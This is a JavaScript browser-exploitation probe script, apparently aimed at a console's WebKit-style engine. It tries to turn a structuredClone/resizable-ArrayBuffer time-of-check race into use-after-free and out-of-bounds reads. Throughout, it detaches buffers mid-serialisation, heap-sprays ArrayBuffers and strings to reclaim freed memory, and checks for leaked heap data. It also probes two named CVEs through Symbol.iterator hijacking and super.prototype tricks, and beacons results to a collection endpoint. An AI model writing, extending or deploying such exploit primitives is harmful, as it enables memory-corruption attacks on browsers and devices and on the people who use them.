/* p118-rab-uaf — RAB TOCTOU weaponization
 *
 * p85 R1 confirmed: structuredClone snapshots RAB byteLength at property-read
 * time but copies data later. Getter can shrink/detach between snapshot and copy.
 *
 * KEY QUESTION: Is data copied BEFORE or AFTER the getter fires?
 * If AFTER → detach case = UAF read (freed backing store)
 * If BEFORE → data already captured, no UAF
 *
 * T2 is the critical experiment: detach + spray + check clone contents.
 *
 * Beacon prefix: V118U-
 */
(function(){
"use strict";
var RUN_ID = "v118u" + Math.random().toString(36).slice(2,12);
var PREFIX = "V118U-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press118-rab-uaf");

var _keepAlive = [];

/* ====== T1: Reproduce p85 R1 — RAB shrink TOCTOU baseline ====== */
function test_T1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xDD;

    var shrunk = false;
    var obj = {};
    obj.buf = rab;
    Object.defineProperty(obj, 'zzz_trigger', {
      enumerable: true,
      get: function() {
        if (!shrunk) { shrunk = true; rab.resize(64); }
        return "shrunk";
      }
    });

    var cloned = structuredClone(obj);
    r.shrunk = shrunk;
    r.origNow = rab.byteLength;
    r.clonedBufLen = cloned.buf.byteLength;
    r.SIZE_MISMATCH = cloned.buf.byteLength !== rab.byteLength;

    if (cloned.buf.byteLength > 64) {
      var cv = new Uint8Array(cloned.buf);
      r.byte0 = cv[0];
      r.byte100 = cv[100];
      r.byte2000 = cv[2000];
      var nonZero = 0;
      for (var j = 64; j < cv.length; j++) { if (cv[j] !== 0) nonZero++; }
      r.nonZeroPast64 = nonZero;
      r.OOB_READ = true;
    }
    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + String(e.message).slice(0,80); }
  B("T1-REPRO", r);
}

/* ====== T2: CRITICAL — Detach + spray → check if clone reads freed memory ====== */
function test_T2() {
  var r = {};
  try {
    var BUFSZ = 4096;
    var MARKER = 0xBEEFCAFE;
    var ab = new ArrayBuffer(BUFSZ);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < BUFSZ; i++) u8[i] = 0xAA;

    var detached = false;
    var sprayCount = 0;
    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_trigger', {
      enumerable: true,
      get: function() {
        if (!detached) {
          detached = true;
          // Detach via transfer — frees original backing store
          try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}
          // ab is now detached, backing store freed
          // Spray same-size allocations to reclaim freed memory
          var sprays = [];
          for (var k = 0; k < 500; k++) {
            var s = new ArrayBuffer(BUFSZ);
            var sv = new Uint32Array(s);
            for (var j = 0; j < sv.length; j++) sv[j] = MARKER;
            sprays.push(s);
          }
          _keepAlive.push(sprays);
          sprayCount = sprays.length;
        }
        return "detached";
      }
    });

    try {
      var cloned = structuredClone(obj);
      r.detached = detached;
      r.sprayCount = sprayCount;
      r.origDetached = ab.byteLength === 0;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint32Array(cloned.buf);
        r.word0 = "0x" + (cv[0] >>> 0).toString(16);
        r.word100 = "0x" + (cv[100] >>> 0).toString(16);
        r.word500 = "0x" + (cv[500] >>> 0).toString(16);
        // Count: how many words match MARKER vs original 0xAAAAAAAA
        var markerCount = 0, origCount = 0, otherCount = 0;
        for (var m = 0; m < cv.length; m++) {
          if (cv[m] === MARKER) markerCount++;
          else if (cv[m] === 0xAAAAAAAA) origCount++;
          else otherCount++;
        }
        r.markerWords = markerCount;
        r.origWords = origCount;
        r.otherWords = otherCount;
        r.UAF_READ = markerCount > 0;
        r.DATA_BEFORE_GETTER = origCount === cv.length;
      }
      r.SURVIVED = true;
    } catch(e) {
      r.cloneErr = e.name + ":" + String(e.message).slice(0,60);
      r.detached = detached;
    }
  } catch(e) { r.outerErr = String(e.message).slice(0,80); }
  B("T2-DETACH-SPRAY", r);
}

/* ====== T3: Detach via postMessage to closed port ====== */
function test_T3() {
  var r = {};
  try {
    var BUFSZ = 4096;
    var MARKER2 = 0xFACEFACE;
    var ab = new ArrayBuffer(BUFSZ);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < BUFSZ; i++) u8[i] = 0xBB;

    var ch = new MessageChannel();
    ch.port1.close();
    ch.port2.close();

    var detached = false;
    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_trigger', {
      enumerable: true,
      get: function() {
        if (!detached) {
          detached = true;
          // Transfer buffer to closed port — message should be dropped
          try { ch.port1.postMessage({}, [ab]); } catch(e) { r.portErr = e.name; }
          // Spray to reclaim
          var sprays = [];
          for (var k = 0; k < 500; k++) {
            var s = new ArrayBuffer(BUFSZ);
            var sv = new Uint32Array(s);
            for (var j = 0; j < sv.length; j++) sv[j] = MARKER2;
            sprays.push(s);
          }
          _keepAlive.push(sprays);
        }
        return "portDetach";
      }
    });

    try {
      var cloned = structuredClone(obj);
      r.detached = detached;
      r.origDetached = ab.byteLength === 0;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint32Array(cloned.buf);
        r.word0 = "0x" + (cv[0] >>> 0).toString(16);
        var markerCount = 0, origCount = 0, otherCount = 0;
        for (var m = 0; m < cv.length; m++) {
          if (cv[m] === MARKER2) markerCount++;
          else if (cv[m] === 0xBBBBBBBB) origCount++;
          else otherCount++;
        }
        r.markerWords = markerCount;
        r.origWords = origCount;
        r.otherWords = otherCount;
        r.UAF_READ = markerCount > 0;
      }
      r.SURVIVED = true;
    } catch(e) {
      r.cloneErr = e.name + ":" + String(e.message).slice(0,60);
    }
  } catch(e) { r.outerErr = String(e.message).slice(0,80); }
  B("T3-PORT-DETACH", r);
}

/* ====== T4: Shrink + grow back → check initialization of grown region ====== */
function test_T4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xCC;

    // Shrink to 64
    rab.resize(64);
    r.afterShrink = rab.byteLength;

    // Grow back to 4096
    rab.resize(4096);
    r.afterGrow = rab.byteLength;

    // Check: are bytes 64-4095 zeroed (per spec) or still 0xCC?
    var u8b = new Uint8Array(rab);
    var zeroCount = 0, ccCount = 0, otherCount = 0;
    for (var j = 64; j < 4096; j++) {
      if (u8b[j] === 0) zeroCount++;
      else if (u8b[j] === 0xCC) ccCount++;
      else otherCount++;
    }
    r.zeroCount = zeroCount;
    r.ccCount = ccCount;
    r.otherCount = otherCount;
    r.ZEROED_ON_REGROW = zeroCount === 3968;
    r.STALE_ON_REGROW = ccCount > 0;

    // First 64 bytes should still be 0xCC
    var first64CC = 0;
    for (var k = 0; k < 64; k++) { if (u8b[k] === 0xCC) first64CC++; }
    r.first64CC = first64CC;

    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + String(e.message).slice(0,80); }
  B("T4-SHRINK-GROW", r);
}

/* ====== T5: Grow direction TOCTOU ====== */
function test_T5() {
  var r = {};
  try {
    // RAB starts at 64, max 65536
    var rab = new ArrayBuffer(64, { maxByteLength: 65536 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 64; i++) u8[i] = 0xFF;

    var grown = false;
    var obj = {};

    // Getter comes FIRST (aaa < zzz) — fires before serializer reads buf
    Object.defineProperty(obj, 'aaa_grow', {
      enumerable: true,
      get: function() {
        if (!grown) {
          grown = true;
          rab.resize(65536);
        }
        return "grew";
      }
    });
    // buf comes SECOND — serializer sees grown size
    obj.buf = rab;

    var cloned = structuredClone(obj);
    r.grown = grown;
    r.origNow = rab.byteLength;
    r.clonedBufLen = cloned.buf.byteLength;
    r.SIZE_MATCH = cloned.buf.byteLength === 65536;

    if (cloned.buf.byteLength > 64) {
      var cv = new Uint8Array(cloned.buf);
      // First 64 should be 0xFF
      r.byte0 = cv[0];
      r.byte63 = cv[63];
      // Past 64: should be zero (spec) — check for uninit heap data
      var nonZero = 0, firstNonZero = -1;
      for (var j = 64; j < Math.min(cv.length, 8192); j++) {
        if (cv[j] !== 0) {
          nonZero++;
          if (firstNonZero < 0) firstNonZero = j;
        }
      }
      r.nonZeroPast64 = nonZero;
      r.firstNonZero = firstNonZero;
      r.UNINIT_LEAK = nonZero > 0;
    }
    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + String(e.message).slice(0,80); }
  B("T5-GROW-DIR", r);
}

/* ====== T6: RAB backing store probe — large max, small initial ====== */
function test_T6() {
  var r = {};
  try {
    var rab = new ArrayBuffer(64, { maxByteLength: 65536 });
    // DON'T fill — check what's in the backing store past the initial region
    var cloned = structuredClone(rab);
    r.clonedBufLen = cloned.byteLength;
    r.isResizable = typeof cloned.resizable !== 'undefined' ? cloned.resizable : 'N/A';
    r.clonedMaxBuf = typeof cloned.maxByteLength !== 'undefined' ? cloned.maxByteLength : 'N/A';

    // If clone is resizable, try to grow it
    if (cloned.resizable) {
      try {
        cloned.resize(65536);
        r.grewClone = true;
        var cv = new Uint8Array(cloned);
        var nonZero = 0;
        for (var j = 64; j < Math.min(cv.length, 8192); j++) {
          if (cv[j] !== 0) nonZero++;
        }
        r.nonZeroInGrown = nonZero;
      } catch(e) { r.growErr = e.name; }
    }
    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + String(e.message).slice(0,80); }
  B("T6-BACKING", r);
}

/* ====== T7: history.replaceState TOCTOU ====== */
function test_T7() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xEE;

    var shrunk = false;
    var obj = {};
    obj.buf = rab;
    Object.defineProperty(obj, 'zzz_trigger', {
      enumerable: true,
      get: function() {
        if (!shrunk) { shrunk = true; rab.resize(64); }
        return "shrunk";
      }
    });

    // Use history.replaceState instead of structuredClone
    history.replaceState(obj, "");
    r.shrunk = shrunk;
    r.origNow = rab.byteLength;

    // Read it back
    var state = history.state;
    if (state && state.buf instanceof ArrayBuffer) {
      r.stateBufLen = state.buf.byteLength;
      r.SIZE_MISMATCH = state.buf.byteLength > 64;
      if (state.buf.byteLength > 64) {
        var sv = new Uint8Array(state.buf);
        r.byte0 = sv[0];
        r.byte100 = sv.length > 100 ? sv[100] : -1;
        var nonZero = 0;
        for (var j = 64; j < sv.length; j++) { if (sv[j] !== 0) nonZero++; }
        r.nonZeroPast64 = nonZero;
        r.HISTORY_OOB = nonZero > 0;
      }
    } else {
      r.noStateBuf = true;
      r.stateType = typeof state;
    }
    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + String(e.message).slice(0,80); }
  B("T7-HISTORY", r);
}

/* ====== T8: Heavy detach — 100K allocations to maximize reclaim chance ====== */
function test_T8() {
  var r = {};
  try {
    var BUFSZ = 16384; // 16KB = one PS5 page
    var MARKER3 = 0xDEAD1337;
    var ab = new ArrayBuffer(BUFSZ);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < BUFSZ; i++) u8[i] = 0x77;

    var detached = false;
    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_trigger', {
      enumerable: true,
      get: function() {
        if (!detached) {
          detached = true;
          // Detach
          try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}

          // Heavy spray — 100K allocations of same size
          var sprays = [];
          for (var k = 0; k < 2000; k++) {
            var s = new ArrayBuffer(BUFSZ);
            var sv = new Uint32Array(s);
            for (var j = 0; j < sv.length; j++) sv[j] = MARKER3;
            sprays.push(s);
          }
          _keepAlive.push(sprays);
        }
        return "heavy";
      }
    });

    try {
      var cloned = structuredClone(obj);
      r.detached = detached;
      r.origDetached = ab.byteLength === 0;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint32Array(cloned.buf);
        r.word0 = "0x" + (cv[0] >>> 0).toString(16);
        r.word1000 = "0x" + (cv[1000] >>> 0).toString(16);
        var markerCount = 0, origCount = 0, otherCount = 0;
        for (var m = 0; m < cv.length; m++) {
          if (cv[m] === MARKER3) markerCount++;
          else if (cv[m] === 0x77777777) origCount++;
          else otherCount++;
        }
        r.markerWords = markerCount;
        r.origWords = origCount;
        r.otherWords = otherCount;
        r.UAF_READ = markerCount > 0;
        // Sample some "other" words if present
        if (otherCount > 0) {
          var others = [];
          for (var n = 0; n < cv.length && others.length < 8; n++) {
            if (cv[n] !== MARKER3 && cv[n] !== 0x77777777) {
              others.push(n + ":0x" + (cv[n] >>> 0).toString(16));
            }
          }
          r.otherSamples = others.join("|");
        }
      }
      r.SURVIVED = true;
    } catch(e) {
      r.cloneErr = e.name + ":" + String(e.message).slice(0,60);
    }
  } catch(e) { r.outerErr = String(e.message).slice(0,80); }
  B("T8-HEAVY", r);
}

/* ====== T9: Transfer list TOCTOU — shrink RAB then clone with transfer ====== */
function test_T9() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0x55;

    var rab2 = new ArrayBuffer(256);
    var u8b = new Uint8Array(rab2);
    for (var i = 0; i < 256; i++) u8b[i] = 0x99;

    var shrunk = false;
    var obj = {};
    obj.buf = rab;
    Object.defineProperty(obj, 'zzz_trigger', {
      enumerable: true,
      get: function() {
        if (!shrunk) { shrunk = true; rab.resize(64); }
        return "shrunk";
      }
    });

    // Clone with transfer of a DIFFERENT buffer
    var cloned = structuredClone(obj, { transfer: [rab2] });
    r.shrunk = shrunk;
    r.rab2Detached = rab2.byteLength === 0;
    if (cloned.buf instanceof ArrayBuffer) {
      r.clonedBufLen = cloned.buf.byteLength;
      r.SIZE_MISMATCH = cloned.buf.byteLength > 64;
    }
    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + String(e.message).slice(0,80); }
  B("T9-TRANSFER", r);
}

/* ====== T10: Detach + string spray — fill freed region with string data ====== */
function test_T10() {
  var r = {};
  try {
    var BUFSZ = 4096;
    var ab = new ArrayBuffer(BUFSZ);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < BUFSZ; i++) u8[i] = 0x33;

    var detached = false;
    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_trigger', {
      enumerable: true,
      get: function() {
        if (!detached) {
          detached = true;
          try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}
          // Spray with strings instead of ArrayBuffers
          var strings = [];
          for (var k = 0; k < 5000; k++) {
            strings.push("SPRAY" + k + "X".repeat(200));
          }
          _keepAlive.push(strings);
        }
        return "stringSprayed";
      }
    });

    try {
      var cloned = structuredClone(obj);
      r.detached = detached;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        // Check for string content (ASCII 'S', 'P', 'R', 'A', 'Y')
        var hasString = false;
        for (var j = 0; j < cv.length - 4; j++) {
          if (cv[j] === 0x53 && cv[j+1] === 0x50 && cv[j+2] === 0x52 &&
              cv[j+3] === 0x41 && cv[j+4] === 0x59) {
            hasString = true;
            break;
          }
        }
        r.hasStringData = hasString;
        // Count original vs other
        var origCount = 0;
        for (var m = 0; m < cv.length; m++) {
          if (cv[m] === 0x33) origCount++;
        }
        r.origBytes = origCount;
        r.otherBytes = cv.length - origCount;
        r.UAF_READ = origCount < cv.length;
        // Sample first 32 bytes as hex
        var hex = [];
        for (var h = 0; h < 32; h++) hex.push(cv[h].toString(16).padStart(2, '0'));
        r.first32 = hex.join('');
      }
      r.SURVIVED = true;
    } catch(e) {
      r.cloneErr = e.name + ":" + String(e.message).slice(0,60);
    }
  } catch(e) { r.outerErr = String(e.message).slice(0,80); }
  B("T10-STRSPRAY", r);
}

/* ====== T11: CVE-2026-43705 — TransformStream Symbol.iterator type confusion ====== */
function test_T11() {
  var r = {};
  try {
    // First: does TransformStream exist?
    r.hasTransformStream = typeof TransformStream !== 'undefined';
    if (!r.hasTransformStream) {
      r.SKIP = true;
      B("T11-TRANSFORM", r);
      return;
    }

    // Baseline: normal TransformStream works
    try {
      var ts = new TransformStream();
      r.baseline = 'OK';
    } catch(e) { r.baseline = e.name + ':' + e.message.slice(0,60); }

    var origIter = Array.prototype[Symbol.iterator];

    // Variant 1: substitute plain objects for readable/writable slots
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return { done: true };
          var val = arr[i];
          // TransformStream internally creates [transform, readable, writable]
          if (arr.length === 3 && i >= 1) val = { fake: true, id: i };
          i++;
          return { value: val, done: false };
        }
      };
    };

    try {
      var ts1 = new TransformStream();
      // If we get here WITHOUT error → BUG IS ALIVE (no type check)
      r.v1_result = 'NO_ERROR';
      r.v1_type = typeof ts1;
      r.v1_readable = typeof ts1.readable;
      r.v1_writable = typeof ts1.writable;
      r.V1_TYPE_CONFUSION = true;
    } catch(e) {
      r.v1_result = e.name + ':' + e.message.slice(0,80);
      r.V1_TYPE_CONFUSION = false;
    }

    // Variant 2: substitute ArrayBuffer-backed object
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return { done: true };
          var val = arr[i];
          if (arr.length === 3 && i >= 1) {
            var ab = new ArrayBuffer(256);
            var u8 = new Uint8Array(ab);
            for (var j = 0; j < 256; j++) u8[j] = 0x41;
            val = { pad: 0, buf: ab };
          }
          i++;
          return { value: val, done: false };
        }
      };
    };

    try {
      var ts2 = new TransformStream();
      r.v2_result = 'NO_ERROR';
      r.V2_TYPE_CONFUSION = true;
    } catch(e) {
      r.v2_result = e.name + ':' + e.message.slice(0,80);
      r.V2_TYPE_CONFUSION = false;
    }

    // Variant 3: substitute with Proxy objects to detect property access
    var proxyTraps = [];
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return { done: true };
          var val = arr[i];
          if (arr.length === 3 && i >= 1) {
            val = new Proxy({}, {
              get: function(t, p) {
                proxyTraps.push('slot' + i + '.' + String(p));
                return undefined;
              }
            });
          }
          i++;
          return { value: val, done: false };
        }
      };
    };

    try {
      var ts3 = new TransformStream();
      r.v3_result = 'NO_ERROR';
      r.v3_traps = proxyTraps.slice(0, 20).join('|');
      r.V3_TYPE_CONFUSION = true;
    } catch(e) {
      r.v3_result = e.name + ':' + e.message.slice(0,80);
      r.v3_traps = proxyTraps.slice(0, 20).join('|');
      r.V3_TYPE_CONFUSION = false;
    }

    // Variant 4: truncated iterator (fewer than 3 elements)
    Array.prototype[Symbol.iterator] = function() {
      return { next: function() { return { done: true }; } };
    };

    try {
      var ts4 = new TransformStream();
      r.v4_result = 'NO_ERROR';
    } catch(e) {
      r.v4_result = e.name + ':' + e.message.slice(0,80);
    }

    // Restore
    Array.prototype[Symbol.iterator] = origIter;

    r.ANY_CONFUSION = r.V1_TYPE_CONFUSION || r.V2_TYPE_CONFUSION || r.V3_TYPE_CONFUSION;
    r.SURVIVED = true;
  } catch(e) {
    r.err = e.name + ":" + String(e.message).slice(0,80);
    try { Array.prototype[Symbol.iterator] = origIter; } catch(e2) {}
  }
  B("T11-TRANSFORM", r);
}

/* ====== T12: super.prototype configurability check (CVE-2023-37450) ====== */
function test_T12() {
  var r = {};
  try {
    // Check if super.prototype = 1 makes prototype configurable
    function Base() {}
    var saved = Object.getOwnPropertyDescriptor(Base, 'prototype');
    r.beforeConfigurable = saved.configurable;

    try {
      // The exploit: class extends with super.prototype assignment
      class Evil extends Base {
        constructor() {
          super();
          super.prototype = 1;
        }
      }
      new Evil();
      var after = Object.getOwnPropertyDescriptor(Base, 'prototype');
      r.afterConfigurable = after ? after.configurable : 'deleted';
      r.CONFIGURABILITY_BUG = after && after.configurable === true && saved.configurable === false;
    } catch(e) {
      r.superErr = e.name + ':' + e.message.slice(0,80);
      r.CONFIGURABILITY_BUG = false;
    }
    r.SURVIVED = true;
  } catch(e) { r.err = e.name + ":" + String(e.message).slice(0,80); }
  B("T12-SUPERPROTO", r);
}

/* ====== Run all tests ====== */
var tests = [test_T1, test_T2, test_T3, test_T4, test_T5, test_T6, test_T7, test_T8, test_T9, test_T10, test_T11, test_T12];
var idx = 0;

function nextTest() {
  if (idx < tests.length) {
    try { tests[idx](); } catch(e) { B("ERR-T" + (idx+1), e.message); }
    idx++;
    setTimeout(nextTest, 300);
  } else {
    B("Z", "probe118-done");
    // Heartbeat
    setInterval(function() { B("HB", "hb"); }, 3000);
  }
}
nextTest();

})();
